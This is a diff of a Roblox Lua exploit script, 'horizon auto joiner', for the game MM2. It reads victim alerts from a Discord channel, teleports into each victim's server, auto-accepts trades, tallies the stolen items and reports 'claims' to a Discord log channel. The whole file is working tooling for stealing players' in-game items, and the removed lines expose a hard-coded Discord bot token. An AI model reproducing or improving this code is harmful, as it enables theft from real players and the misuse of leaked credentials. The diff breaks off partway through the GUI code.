@@ -1,63 +1,56 @@
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local TeleportService = game:GetService("TeleportService")
-local UIS = game:GetService("UserInputService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local TweenService = game:GetService("TweenService")
+-- globals are set by your local auto executor snippet before this runs
+local token            = bottoken
+local channelId        = chanelid
+local logChannelId     = logid
+local tradesBeforeNext = tradesbeforenext or 1
 
--- ╔══════════════════════════════════════════╗
--- ║              CONFIG BLOCK                ║
--- ║  channelId: extracted from Westeria's    ║
--- ║  webhook URL (the numeric segment)       ║
--- ║  token: your Discord bot token           ║
--- ╚══════════════════════════════════════════╝
-local channelId = "1543214605667672146"
-local token = "MTU0Mjk2MzIwOTY1OTQ4NjI0OQ.GbiqwD.d-IAxfCDmx8dcYH18LaUssZsJXyQWw4UQG9ook"
+local HttpService      = game:GetService("HttpService")
+local Players          = game:GetService("Players")
+local LocalPlayer      = Players.LocalPlayer
+local TeleportService  = game:GetService("TeleportService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
 local valueAPI = "https://api.project-reverse.org/valuables/get-game-valuables?game=mm2"
 
-local folder = "horizon auto joiner"
+local folder        = "horizon auto joiner"
 local claimedFolder = folder .. "/claimeditems"
-local joinedFolder = folder .. "/joinedservers"
-local totalFolder = folder .. "/total"
+local joinedFolder  = folder .. "/joinedservers"
+local totalFolder   = folder .. "/total"
 
-local values = {}
-local lastMsg = nil
-local running = true
-local victim = nil
-local targetJobId = nil
-local targetPlaceId = nil
-local totalValue = 0
-local totalClaims = 0
-local totalJoins = 0
-local isJoining = false
-local isClaiming = false
-local autoAccept = true
-local currentEmbedId = nil
+local values           = {}
+local lastMsg          = nil
+local running          = true
+local victim           = nil
+local targetJobId      = nil
+local targetPlaceId    = nil
+local totalValue       = 0
+local totalClaims      = 0
+local totalJoins       = 0
+local isJoining        = false
+local isClaiming       = false
+local autoAccept       = true
+local currentEmbedId   = nil
 local lastCheckedMsgId = nil
-local lastStatusMsgId = nil
-local myInvValue = 0
-local currentStatus = "waiting"
-local lastOffer = nil
-local seqId = nil
+local lastStatusMsgId  = nil
+local myInvValue       = 0
+local currentStatus    = "waiting"
+local lastOffer        = nil
+local seqId            = nil
+local tradesDone       = 0
 
-local Trade = ReplicatedStorage:WaitForChild("Trade")
-local oldInv = {}
+local Trade       = ReplicatedStorage:WaitForChild("Trade")
+local oldInv      = {}
 local hasSnapshot = false
 
 local function createFolders()
-    if not isfolder(folder) then makefolder(folder) end
+    if not isfolder(folder)        then makefolder(folder)        end
     if not isfolder(claimedFolder) then makefolder(claimedFolder) end
-    if not isfolder(joinedFolder) then makefolder(joinedFolder) end
-    if not isfolder(totalFolder) then makefolder(totalFolder) end
+    if not isfolder(joinedFolder)  then makefolder(joinedFolder)  end
+    if not isfolder(totalFolder)   then makefolder(totalFolder)   end
 end
 
 local function loadValues()
-    local res = request({
-        Url = valueAPI,
-        Method = "GET"
-    })
+    local res = request({ Url = valueAPI, Method = "GET" })
     if res.StatusCode == 200 then
         local data = HttpService:JSONDecode(res.Body)
         if data.success and data.data then
@@ -73,35 +66,21 @@ local function getValue(name)
     return values[name:lower()] or 0
 end
 
--- ┌─────────────────────────────────────────────────────┐
--- │  FIXED: handles both Horizon's original format AND  │
--- │  Westeria's plsbrainrot.me join link format         │
--- └─────────────────────────────────────────────────────┘
 local function getScript(text)
-    -- original horizon format: TeleportToPlaceInstance(pid, "jid")
     local pid, jid = text:match('TeleportToPlaceInstance%((%d+),%s*"([%w%-]+)"%)')
     if pid and jid then return tonumber(pid), jid end
-
-    -- westeria / plsbrainrot format: placeId=N&gameInstanceId=UUID
     local pid2, jid2 = text:match("placeId=(%d+)&gameInstanceId=([%w%-]+)")
     if pid2 and jid2 then return tonumber(pid2), jid2 end
-
     return nil, nil
 end
 
--- ┌─────────────────────────────────────────────────────┐
--- │  FIXED: lowercased scan so "Username:" matches      │
--- │  Added "Tradeable Value:" fallback for totalValue   │
--- └─────────────────────────────────────────────────────┘
 local function getUserInfo(msg)
     local info = {}
     local text = ""
-
     if msg.content then text = text .. msg.content .. "\n" end
-
     if msg.embeds then
         for _, embed in ipairs(msg.embeds) do
-            if embed.title then text = text .. embed.title .. "\n" end
+            if embed.title       then text = text .. embed.title .. "\n" end
             if embed.description then text = text .. embed.description .. "\n" end
             if embed.fields then
                 for _, field in ipairs(embed.fields) do
@@ -110,7 +89,6 @@ local function getUserInfo(msg)
             end
         end
     end
-
     if msg.components then
         for _, component in ipairs(msg.components) do
             if component.components then
@@ -120,23 +98,13 @@ local function getUserInfo(msg)
             end
         end
     end
-
-    -- lowercase the full text blob so both "username:" and "Username:" match
     local ltext = text:lower()
-
-    info.username  = ltext:match("username%s*:%s*([%w_]+)")
-    info.display   = ltext:match("display%s*:%s*([%w_]+)")
-    info.executor  = ltext:match("executor%s*:%s*([%w_]+)")
-    info.receiver  = ltext:match("receiver%s*:%s*([%w_]+)")
-
-    -- original Horizon format: **Total Value**\n**$N**
+    info.username   = ltext:match("username%s*:%s*([%w_]+)")
+    info.display    = ltext:match("display%s*:%s*([%w_]+)")
     info.totalValue = text:match("%*%*Total Value%*%*\n%*%*%$([%d.]+)%*%*")
-
-    -- Westeria format: Tradeable Value: N  (inside Stats code block)
     if not info.totalValue then
         info.totalValue = ltext:match("tradeable value%s*:%s*(%d+)")
     end
-
     return info
 end
 
@@ -144,9 +112,7 @@ local function getLatestMessages()
     local res = request({
         Url = "https://discord.com/api/v10/channels/" .. channelId .. "/messages?limit=5",
         Method = "GET",
-        Headers = {
-            ["Authorization"] = "Bot " .. token
-        }
+        Headers = { ["Authorization"] = "Bot " .. token }
     })
     if res.StatusCode == 200 then
         local messages = HttpService:JSONDecode(res.Body)
@@ -197,9 +163,7 @@ local function makeContainer(title, description, accentColor, fields, footer)
             table.insert(gridComponents, makeGridColumn(field.name, field.value))
         end
         table.insert(containerComponents, {
-            type = 1,
-            layout = 1,
-            components = gridComponents
+            type = 1, layout = 1, components = gridComponents
         })
     end
     if footer then table.insert(containerComponents, makeTextDisplay(footer)) end
@@ -208,16 +172,13 @@ end
 
 local function sendDiscord(components)
     local res = request({
-        Url = "https://discord.com/api/v10/channels/" .. channelId .. "/messages",
+        Url = "https://discord.com/api/v10/channels/" .. logChannelId .. "/messages",
         Method = "POST",
         Headers = {
             ["Authorization"] = "Bot " .. token,
-            ["Content-Type"] = "application/json"
+            ["Content-Type"]  = "application/json"
         },
-        Body = HttpService:JSONEncode({
-            flags = 32768,
-            components = components
-        })
+        Body = HttpService:JSONEncode({ flags = 32768, components = components })
     })
     if res.StatusCode == 200 then
         local ok, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
@@ -228,16 +189,13 @@ end
 
 local function editDiscord(msgId, components)
     local res = request({
-        Url = "https://discord.com/api/v10/channels/" .. channelId .. "/messages/" .. msgId,
+        Url = "https://discord.com/api/v10/channels/" .. logChannelId .. "/messages/" .. msgId,
         Method = "PATCH",
         Headers = {
             ["Authorization"] = "Bot " .. token,
-            ["Content-Type"] = "application/json"
+            ["Content-Type"]  = "application/json"
         },
-        Body = HttpService:JSONEncode({
-            flags = 32768,
-            components = components
-        })
+        Body = HttpService:JSONEncode({ flags = 32768, components = components })
     })
     return res.StatusCode == 200
 end
@@ -247,122 +205,92 @@ local function saveBackup()
     local success, inv = pcall(getinv)
     if not success or not inv then return end
     local itemsText = ""
-    local totalVal = 0
+    local totalVal  = 0
     for itemId, amount in pairs(inv) do
-        local name = getItemName(itemId)
+        local name  = getItemName(itemId)
         local value = getValue(name) or 0
-        totalVal = totalVal + (value * amount)
-        itemsText = itemsText .. string.format("%s x%d - $%.2f\n", tostring(name), amount, value * amount)
+        totalVal    = totalVal + (value * amount)
+        itemsText   = itemsText .. string.format("%s x%d - $%.2f\n", tostring(name), amount, value * amount)
     end
-    local backupContent = string.format([[
-========================================
-HORIZON AUTO JOINER - BACKUP
-========================================
-Saved: %s
-
-TOTAL VALUE: $%.2f
-
-ITEMS:
-%s
-========================================
-]], os.date("%Y-%m-%d %H:%M:%S"), totalVal, itemsText)
-    writefile(file, backupContent)
+    writefile(file, string.format("Saved: %s\nTotal: $%.2f\n\n%s", os.date("%Y-%m-%d %H:%M:%S"), totalVal, itemsText))
 end
 
 local function saveJoined(name, jid, pid)
-    local file = joinedFolder .. "/" .. os.date("%Y-%m-%d") .. ".txt"
-    local line = name .. " - " .. jid .. " - " .. pid
-    local content = ""
-    if isfile(file) then content = readfile(file) end
-    writefile(file, content .. line .. "\n")
+    local file    = joinedFolder .. "/" .. os.date("%Y-%m-%d") .. ".txt"
+    local content = isfile(file) and readfile(file) or ""
+    writefile(file, content .. name .. " - " .. jid .. " - " .. pid .. "\n")
 end
 
 local function saveClaimed(name, jid, value)
-    local file = claimedFolder .. "/" .. os.date("%Y-%m-%d") .. ".txt"
-    local line = name .. " - " .. jid .. " - " .. value
-    local content = ""
-    if isfile(file) then content = readfile(file) end
-    writefile(file, content .. line .. "\n")
+    local file    = claimedFolder .. "/" .. os.date("%Y-%m-%d") .. ".txt"
+    local content = isfile(file) and readfile(file) or ""
+    writefile(file, content .. name .. " - " .. jid .. " - " .. value .. "\n")
 end
 
 local function updateTotal()
-    local file = totalFolder .. "/stats.txt"
-    local content = string.format([[
-========================================
-HORIZON AUTO JOINER - TOTAL STATS
-========================================
-Last Updated: %s
-
-TOTAL JOINS: %d
-TOTAL CLAIMS: %d
-TOTAL VALUE: %d
-========================================
-]], os.date("%Y-%m-%d %H:%M:%S"), totalJoins, totalClaims, totalValue)
-    writefile(file, content)
+    writefile(totalFolder .. "/stats.txt", string.format(
+        "Updated: %s\nJoins: %d\nClaims: %d\nValue: %d",
+        os.date("%Y-%m-%d %H:%M:%S"), totalJoins, totalClaims, totalValue
+    ))
 end
 
 local function calculateInvValue()
-    local inv = getinv()
+    local inv   = getinv()
     local total = 0
     for itemId, amount in pairs(inv) do
-        local name = getItemName(itemId)
-        local value = getValue(name) or 0
-        total = total + (value * amount)
+        total = total + (getValue(getItemName(itemId)) * amount)
     end
     return total
 end
 
 local function sendStatus(statusText)
     currentStatus = statusText
-    local statusPayload = makeContainer(
+    local payload = makeContainer(
         "**Auto Joiner Status**",
         "`current: " .. statusText .. "`",
         0xF1C40F,
         {
-            {name = "Total Value", value = "**$" .. string.format("%.2f", totalValue) .. "**"},
-            {name = "Total Claims", value = tostring(totalClaims)}
+            { name = "Total Value",  value = "**$" .. string.format("%.2f", totalValue) .. "**" },
+            { name = "Total Claims", value = tostring(totalClaims) }
         },
         "_horizon aj_"
     )
     if lastStatusMsgId then
-        editDiscord(lastStatusMsgId, statusPayload)
+        editDiscord(lastStatusMsgId, payload)
     else
-        lastStatusMsgId = sendDiscord(statusPayload)
+        lastStatusMsgId = sendDiscord(payload)
     end
 end
 
 local function sendInventoryEmbed()
     local total = calculateInvValue()
-    myInvValue = total
-    local inv = getinv()
+    myInvValue  = total
+    local inv   = getinv()
     local items = {}
     for itemId, amount in pairs(inv) do
-        local name = getItemName(itemId)
+        local name  = getItemName(itemId)
         local value = getValue(name) or 0
-        table.insert(items, {name = name, amount = amount, value = value})
+        table.insert(items, { name = name, amount = amount, value = value })
     end
-    table.sort(items, function(a, b)
-        return (a.value * a.amount) > (b.value * b.amount)
-    end)
+    table.sort(items, function(a, b) return (a.value * a.amount) > (b.value * b.amount) end)
     local itemsText = ""
     for i, item in ipairs(items) do
         if i <= 15 then
             itemsText = itemsText .. string.format("• %s x%d — $%.2f\n", item.name, item.amount, item.value * item.amount)
         end
     end
-    if #items > 15 then itemsText = itemsText .. "\n... and " .. (#items - 15) .. " more items" end
-    local inventoryPayload = makeContainer(
+    if #items > 15 then itemsText = itemsText .. "\n... and " .. (#items - 15) .. " more" end
+    sendDiscord(makeContainer(
         "**Inventory**",
         "```yaml\n" .. itemsText .. "\n```",
         0x3498DB,
         {
-            {name = "Total Value", value = "**$" .. string.format("%.2f", total) .. "**"},
-            {name = "Items", value = tostring(#items)},
-            {name = "Claims", value = tostring(totalClaims)}
+            { name = "Total Value", value = "**$" .. string.format("%.2f", total) .. "**" },
+            { name = "Items",       value = tostring(#items) },
+            { name = "Claims",      value = tostring(totalClaims) }
         },
         "_horizon aj_"
-    )
-    sendDiscord(inventoryPayload)
+    ))
 end
 
 local function checkCommands()
@@ -371,27 +299,23 @@ local function checkCommands()
     for _, msg in ipairs(messages) do
         if msg.content then
             local cmd = msg.content:lower()
-            if cmd == "!inventory" or cmd == "!inv" then
-                if lastCheckedMsgId ~= msg.id then
-                    lastCheckedMsgId = msg.id
-                    sendInventoryEmbed()
-                end
-            elseif cmd == "!status" or cmd == ".status" then
-                if lastCheckedMsgId ~= msg.id then
-                    lastCheckedMsgId = msg.id
-                    sendStatus(currentStatus)
-                end
+            if (cmd == "!inventory" or cmd == "!inv") and lastCheckedMsgId ~= msg.id then
+                lastCheckedMsgId = msg.id
+                sendInventoryEmbed()
+            elseif (cmd == "!status" or cmd == ".status") and lastCheckedMsgId ~= msg.id then
+                lastCheckedMsgId = msg.id
+                sendStatus(currentStatus)
             end
         end
     end
 end
 
-local function printMessageInfo(msg)
+local function extractTexts(msg)
     local texts = {}
     if msg.content and msg.content ~= "" then table.insert(texts, msg.content) end
     if msg.embeds then
         for _, embed in ipairs(msg.embeds) do
-            if embed.title then table.insert(texts, embed.title) end
+            if embed.title       then table.insert(texts, embed.title) end
             if embed.description then table.insert(texts, embed.description) end
             if embed.fields then
                 for _, field in ipairs(embed.fields) do
@@ -410,54 +334,18 @@ local function printMessageInfo(msg)
             end
         end
     end
-    local pid, jid = nil, nil
-    for _, text in ipairs(texts) do
-        local foundPid, foundJid = getScript(text)
-        if foundPid and foundJid then
-            pid = foundPid
-            jid = foundJid
-            break
-        end
-    end
-    if jid then
-        print(string.format("message %s | JobID: %s | Current: %s", msg.timestamp or "N/A", jid, game.JobId))
-    end
+    return texts
 end
 
 local function processMsg(msg)
-    local pid, jid
-    local fullScript = nil
-    local texts = {}
-
-    if msg.content and msg.content ~= "" then table.insert(texts, msg.content) end
-    if msg.embeds then
-        for _, embed in ipairs(msg.embeds) do
-            if embed.title then table.insert(texts, embed.title) end
-            if embed.description then table.insert(texts, embed.description) end
-            if embed.fields then
-                for _, field in ipairs(embed.fields) do
-                    table.insert(texts, field.name)
-                    table.insert(texts, field.value)
-                end
-            end
-        end
-    end
-    if msg.components then
-        for _, component in ipairs(msg.components) do
-            if component.components then
-                for _, child in ipairs(component.components) do
-                    if child.text then table.insert(texts, child.text) end
-                end
-            end
-        end
-    end
+    local texts = extractTexts(msg)
+    local pid, jid, fullScript
 
     for _, text in ipairs(texts) do
         local foundPid, foundJid = getScript(text)
         if foundPid and foundJid then
-            pid = foundPid
-            jid = foundJid
-            -- build a standard teleport script string for the log embed
+            pid        = foundPid
+            jid        = foundJid
             fullScript = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")', foundPid, foundJid)
             break
         end
@@ -465,50 +353,43 @@ local function processMsg(msg)
 
     if not pid or not jid then return end
 
-    local info = getUserInfo(msg)
+    local info  = getUserInfo(msg)
     local value = tonumber(info.totalValue) or 0
+    victim      = info.username or info.display or "Unknown"
 
     if game.JobId == jid then
-        victim = info.username or info.display or "Unknown"
-        targetPlaceId = pid
-        targetJobId = jid
+        targetPlaceId  = pid
+        targetJobId    = jid
         currentEmbedId = msg.id
-        hasSnapshot = false
+        hasSnapshot    = false
         sendStatus("claiming: " .. victim)
         return
     end
 
-    victim = info.username or info.display or "Unknown"
-    targetPlaceId = pid
-    targetJobId = jid
+    targetPlaceId  = pid
+    targetJobId    = jid
     currentEmbedId = msg.id
-    isJoining = true
+    isJoining      = true
+    tradesDone     = 0
 
     saveJoined(victim, targetJobId, targetPlaceId)
     saveBackup()
     totalJoins = totalJoins + 1
     updateTotal()
-
     hasSnapshot = false
 
-    print("\nexecuting join script:")
-    print("script here " .. fullScript)
-
     sendStatus("joining: " .. victim)
-
-    local joiningPayload = makeContainer(
+    editDiscord(currentEmbedId, makeContainer(
         "**Joining: " .. victim .. "**",
         "```lua\n" .. fullScript .. "\n```\n`status: teleporting...`",
         0xF1C40F,
         {
-            {name = "Victim", value = "**" .. victim .. "**"},
-            {name = "Value", value = "$" .. string.format("%.2f", value)},
-            {name = "Total Joins", value = tostring(totalJoins)}
+            { name = "Victim",      value = "**" .. victim .. "**" },
+            { name = "Value",       value = "$" .. string.format("%.2f", value) },
+            { name = "Total Joins", value = tostring(totalJoins) }
         },
         "_horizon aj_"
-    )
-
-    editDiscord(currentEmbedId, joiningPayload)
+    ))
 
     TeleportService:TeleportToPlaceInstance(targetPlaceId, targetJobId, LocalPlayer)
     isJoining = false
@@ -516,22 +397,19 @@ end
 
 local function checkIfInCorrectServer()
     if not targetJobId then return end
-    if game.JobId ~= targetJobId then
+    if game.JobId ~= targetJobId and not isJoining then
         task.wait(3)
         if game.JobId ~= targetJobId and not isJoining then
             isJoining = true
             TeleportService:TeleportToPlaceInstance(targetPlaceId, targetJobId, LocalPlayer)
             isJoining = false
         end
-        return false
     end
-    return true
 end
 
 local function isVictimInServer()
     if not victim then return false end
-    local targetPlayer = Players:FindFirstChild(victim)
-    if targetPlayer then return true end
+    if Players:FindFirstChild(victim) then return true end
     for _, player in ipairs(Players:GetPlayers()) do
         if player.DisplayName == victim then return true end
     end
@@ -539,64 +417,79 @@ local function isVictimInServer()
 end
 
 local function checkClaim()
-    if isClaiming then return end
-    if not isVictimInServer() then return end
+    if isClaiming or not isVictimInServer() then return end
     isClaiming = true
+
     local currentInv = getinv()
+
     if not hasSnapshot then
-        oldInv = currentInv
+        oldInv      = currentInv
         hasSnapshot = true
-        isClaiming = false
+        isClaiming  = false
         return
     end
-    local newItems = {}
+
+    local newItems   = {}
     local claimValue = 0
+
     for itemId, amount in pairs(currentInv) do
         local oldAmount = oldInv[itemId] or 0
         if amount > oldAmount then
-            local itemName = getItemName(itemId)
+            local itemName  = getItemName(itemId)
             local itemValue = getValue(itemName) or 0
-            local diff = amount - oldAmount
-            claimValue = claimValue + (itemValue * diff)
+            local diff      = amount - oldAmount
+            claimValue      = claimValue + (itemValue * diff)
             newItems[itemName] = diff
         end
     end
+
     if claimValue > 0 and victim then
-        totalValue = totalValue + claimValue
-        totalClaims = totalClaims + 1
-        saveClaimed(victim, targetJobId or game.JobId, claimValue)
-        saveBackup()
-        updateTotal()
-        local itemsText = ""
-        for name, amount in pairs(newItems) do
-            itemsText = itemsText .. string.format("%s x%d - $%.2f\n", name, amount, getValue(name) * amount)
+        tradesDone = tradesDone + 1
+        if tradesDone >= tradesBeforeNext then
+            totalValue  = totalValue + claimValue
+            totalClaims = totalClaims + 1
+            saveClaimed(victim, targetJobId or game.JobId, claimValue)
+            saveBackup()
+            updateTotal()
+
+            local itemsText = ""
+            for name, amount in pairs(newItems) do
+                itemsText = itemsText .. string.format("%s x%d - $%.2f\n", name, amount, getValue(name) * amount)
+            end
+
+            sendDiscord(makeContainer(
+                "**claimed: " .. victim .. "**",
+                "```yaml\n" .. itemsText .. "\n```",
+                0x3EED50,
+                {
+                    { name = "Claim Value", value = "**$" .. string.format("%.2f", claimValue) .. "**" },
+                    { name = "Total Value", value = "**$" .. string.format("%.2f", totalValue) .. "**" }
+                },
+                "_horizon aj_"
+            ))
+
+            sendStatus("waiting")
+            victim         = nil
+            targetJobId    = nil
+            targetPlaceId  = nil
+            currentEmbedId = nil
+            hasSnapshot    = false
+            isJoining      = false
+            tradesDone     = 0
+        else
+            oldInv      = currentInv
+            hasSnapshot = false
         end
-        local claimPayload = makeContainer(
-            "**claimed: " .. victim .. "**",
-            "```yaml\n" .. itemsText .. "\n```",
-            0x3EED50,
-            {
-                {name = "Total Value", value = "**$" .. string.format("%.2f", totalValue) .. "**"}
-            },
-            "_horizon aj_"
-        )
-        sendDiscord(claimPayload)
-        sendStatus("waiting")
-        victim = nil
-        targetJobId = nil
-        targetPlaceId = nil
-        currentEmbedId = nil
-        hasSnapshot = false
-        isJoining = false
     end
-    oldInv = currentInv
+
+    oldInv     = currentInv
     isClaiming = false
 end
 
 Trade.UpdateTrade.OnClientEvent:Connect(function(data)
     if data then
         lastOffer = data.LastOffer or lastOffer
-        seqId = data.Sequence or seqId
+        seqId     = data.Sequence  or seqId
     end
 end)
 
@@ -638,169 +531,161 @@ local function monitorTrade()
 end
 
 local function createGui()
-    local screen = Instance.new("ScreenGui")
-    screen.Name = "HorizonGUI"
-    screen.ResetOnSpawn = false
-    screen.IgnoreGuiInset = true
-    screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    screen.Enabled = true
-    screen.Parent = LocalPlayer:WaitForChild("PlayerGui")
+    local screen              = Instance.new("ScreenGui")
+    screen.Name               = "HorizonGUI"
+    screen.ResetOnSpawn       = false
+    screen.IgnoreGuiInset     = true
+    screen.ZIndexBehavior     = Enum.ZIndexBehavior.Sibling
+    screen.Parent             = LocalPlayer:WaitForChild("PlayerGui")
 
-    local main = Instance.new("Frame")
-    main.Name = "MainFrame"
-    main.Size = UDim2.new(0, 380, 0, 340)
-    main.Position = UDim2.new(0.65, 0, 0.25, 0)
-    main.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
-    main.BorderSizePixel = 0
-    main.Active = true
-    main.Parent = screen
+    local main                = Instance.new("Frame")
+    main.Size                 = UDim2.new(0, 380, 0, 340)
+    main.Position             = UDim2.new(0.65, 0, 0.25, 0)
+    main.BackgroundColor3     = Color3.fromRGB(8, 8, 12)
+    main.BorderSizePixel      = 0
+    main.Active               = true
+    main.Parent               = screen
 
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, 16)
-    corner.Parent = main
+    local corner              = Instance.new("UICorner")
+    corner.CornerRadius       = UDim.new(0, 16)
+    corner.Parent             = main
 
-    local stroke = Instance.new("UIStroke")
-    stroke.Color = Color3.fromRGB(255, 200, 50)
-    stroke.Thickness = 1
-    stroke.Transparency = 0.5
-    stroke.Parent = main
+    local stroke              = Instance.new("UIStroke")
+    stroke.Color              = Color3.fromRGB(255, 200, 50)
+    stroke.Thickness          = 1
+    stroke.Transparency       = 0.5
+    stroke.Parent             = main
 
-    local titleBar = Instance.new("Frame")
-    titleBar.Size = UDim2.new(1, 0, 0, 45)
+    local titleBar            = Instance.new("Frame")
+    titleBar.Size             = UDim2.new(1, 0, 0, 45)
     titleBar.BackgroundColor3 = Color3.fromRGB(12, 12, 18)
-    titleBar.BorderSizePixel = 0
-    titleBar.Parent = main
+    titleBar.BorderSizePixel  = 0
+    titleBar.Parent           = main
 
-    local titleCorner = Instance.new("UICorner")
-    titleCorner.CornerRadius = UDim.new(0, 16)
-    titleCorner.Parent = titleBar
+    local titleCorner         = Instance.new("UICorner")
+    titleCorner.CornerRadius  = UDim.new(0, 16)
+    titleCorner.Parent        = titleBar
 
-    local title = Instance.new("TextLabel")
-    title.Parent = titleBar
+    local title               = Instance.new("TextLabel")
+    title.Parent              = titleBar
     title.BackgroundTransparency = 1
-    title.Position = UDim2.new(0, 20, 0, 8)
-    title.Size = UDim2.new(1, -40, 0, 28)
-    title.Font = Enum.Font.GothamBold
-    title.Text = "HORIZON AJ"
-    title.TextColor3 = Color3.fromRGB(255, 200, 50)
-    title.TextSize = 20
-    title.TextXAlignment = Enum.TextXAlignment.Left
+    title.Position            = UDim2.new(0, 20, 0, 8)
+    title.Size                = UDim2.new(1, -40, 0, 28)
+    title.Font                = Enum.Font.GothamBold
+    title.Text                = "HORIZON AJ"
+    title.TextColor3          = Color3.fromRGB(255, 200, 50)
+    title.TextSize            = 20
+    title.TextXAlignment      = Enum.TextXAlignment.Left
 
-    local statusLabel = Instance.new("TextLabel")
-    statusLabel.Parent = main
+    local statusLabel         = Instance.new("TextLabel")
+    statusLabel.Parent        = main
     statusLabel.BackgroundTransparency = 1
-    statusLabel.Position = UDim2.new(0, 20, 0, 55)
-    statusLabel.Size = UDim2.new(1, -40, 0, 20)
-    statusLabel.Font = Enum.Font.Code
-    statusLabel.Text = "> STATUS: WAITING"
-    statusLabel.TextColor3 = Color3.fromRGB(255, 200, 50)
-    statusLabel.TextSize = 12
+    statusLabel.Position      = UDim2.new(0, 20, 0, 55)
+    statusLabel.Size          = UDim2.new(1, -40, 0, 20)
+    statusLabel.Font          = Enum.Font.Code
+    statusLabel.Text          = "> STATUS: WAITING"
+    statusLabel.TextColor3    = Color3.fromRGB(255, 200, 50)
+    statusLabel.TextSize      = 12
     statusLabel.TextXAlignment = Enum.TextXAlignment.Left
 
-    local valueLabel = Instance.new("TextLabel")
-    valueLabel.Parent = main
+    local valueLabel          = Instance.new("TextLabel")
+    valueLabel.Parent         = main
     valueLabel.BackgroundTransparency = 1
-    valueLabel.Position = UDim2.new(0, 20, 0, 80)
-    valueLabel.Size = UDim2.new(1, -40, 0, 20)
-    valueLabel.Font = Enum.Font.Code
-    valueLabel.Text = "> CLAIMED: $0.00"
-    valueLabel.TextColor3 = Color3.fromRGB(255, 180, 0)
-    valueLabel.TextSize = 11
+    valueLabel.Position       = UDim2.new(0, 20, 0, 80)
+    valueLabel.Size           = UDim2.new(1, -40, 0, 20)
+    valueLabel.Font           = Enum.Font.Code
+    valueLabel.Text           = "> CLAIMED: $0.00"
+    valueLabel.TextColor3     = Color3.fromRGB(255, 180, 0)
+    valueLabel.TextSize       = 11
     valueLabel.TextXAlignment = Enum.TextXAlignment.Left
 
-    local invLabel = Instance.new("TextLabel")
-    invLabel.Parent = main
+    local invLabel            = Instance.new("TextLabel")
+    invLabel.Parent           = main
     invLabel.BackgroundTransparency = 1
-    invLabel.Position = UDim2.new(0, 20, 0, 105)
-    invLabel.Size = UDim2.new(1, -40, 0, 20)
-    invLabel.Font = Enum.Font.Code
-    invLabel.Text = "> INV: $0.00"
-    invLabel.TextColor3 = Color3.fromRGB(150, 140, 100)
-    invLabel.TextSize = 11
-    invLabel.TextXAlignment = Enum.TextXAlignment.Left
+    invLabel.Position         = UDim2.new(0, 20, 0, 105)
+    invLabel.Size             = UDim2.new(1, -40, 0, 20)
+    invLabel.Font             = Enum.Font.Code
+    invLabel.Text             = "> INV: $0.00"
+    invLabel.TextColor3       = Color3.fromRGB(150, 140, 100)
+    invLabel.TextSize         = 11
+    invLabel.TextXAlignment   = Enum.TextXAlignment.Left
 
-    local divider = Instance.new("Frame")
-    divider.Parent = main
-    divider.BackgroundColor3 = Color3.fromRGB(40, 35, 20)
-    divider.BorderSizePixel = 0
-    divider.Position = UDim2.new(0, 20, 0, 132)
-    divider.Size = UDim2.new(1, -40, 0, 1)
+    local divider             = Instance.new("Frame")
+    divider.Parent            = main
+    divider.BackgroundColor3  = Color3.fromRGB(40, 35, 20)
+    divider.BorderSizePixel   = 0
+    divider.Position          = UDim2.new(0, 20, 0, 132)
+    divider.Size              = UDim2.new(1, -40, 0, 1)
 
-    local consoleLog = Instance.new("ScrollingFrame")
-    consoleLog.Name = "ConsoleLog"
-    consoleLog.Parent = main
+    local consoleLog          = Instance.new("ScrollingFrame")
+    consoleLog.Parent         = main
     consoleLog.BackgroundColor3 = Color3.fromRGB(5, 5, 10)
     consoleLog.BorderSizePixel = 0
-    consoleLog.Position = UDim2.new(0, 20, 0, 140)
-    consoleLog.Size = UDim2.new(1, -40, 0, 150)
-    consoleLog.CanvasSize = UDim2.new(0, 0, 0, 0)
+    consoleLog.Position       = UDim2.new(0, 20, 0, 140)
+    consoleLog.Size           = UDim2.new(1, -40, 0, 150)
+    consoleLog.CanvasSize     = UDim2.new(0, 0, 0, 0)
     consoleLog.ScrollBarThickness = 0
-    consoleLog.ScrollingEnabled = false
     consoleLog.ClipsDescendants = true
 
-    local logCorner = Instance.new("UICorner")
-    logCorner.CornerRadius = UDim.new(0, 8)
-    logCorner.Parent = consoleLog
+    local logCorner           = Instance.new("UICorner")
+    logCorner.CornerRadius    = UDim.new(0, 8)
+    logCorner.Parent          = consoleLog
 
-    local consoleStroke = Instance.new("UIStroke")
-    consoleStroke.Color = Color3.fromRGB(40, 35, 20)
-    consoleStroke.Thickness = 1
-    consoleStroke.Parent = consoleLog
+    local consoleStroke       = Instance.new("UIStroke")
+    consoleStroke.Color       = Color3.fromRGB(40, 35, 20)
+    consoleStroke.Thickness   = 1
+    consoleStroke.Parent      = consoleLog
 
-    local consoleText = Instance.new("TextLabel")
-    consoleText.Name = "ConsoleText"
-    consoleText.Parent = consoleLog
+    local consoleText         = Instance.new("TextLabel")
+    consoleText.Name          = "ConsoleText"
+    consoleText.Parent        = consoleLog
     consoleText.BackgroundTransparency = 1
-    consoleText.Position = UDim2.new(0, 10, 0, 8)
-    consoleText.Size = UDim2.new(1, -20, 0, 0)
-    consoleText.Font = Enum.Font.Code
-    consoleText.Text = ""
-    consoleText.TextColor3 = Color3.fromRGB(180, 160, 100)
-    consoleText.TextSize = 11
+    consoleText.Position      = UDim2.new(0, 10, 0, 8)
+    consoleText.Size          = UDim2.new(1, -20, 0, 0)
+    consoleText.Font          = Enum.Font.Code
+    consoleText.Text          = ""
+    consoleText.TextColor3    = Color3.fromRGB(180, 160, 100)
+    consoleText.TextSize      = 11
     consoleText.TextXAlignment = Enum.TextXAlignment.Left
     consoleText.TextYAlignment = Enum.TextYAlignment.Top
-    consoleText.RichText = true
+    consoleText.RichText      = true
 
-    local autoBtn = Instance.new("TextButton")
-    autoBtn.Name = "AutoBtn"
-    autoBtn.Parent = main
-    autoBtn.BackgroundColor3 = Color3.fromRGB(20, 18, 10)
-    autoBtn.Position = UDim2.new(0, 20, 0, 300)
-    autoBtn.Size = UDim2.new(1, -40, 0, 28)
-    autoBtn.Font = Enum.Font.Code
-    autoBtn.Text = "[ AUTO: ON ]"
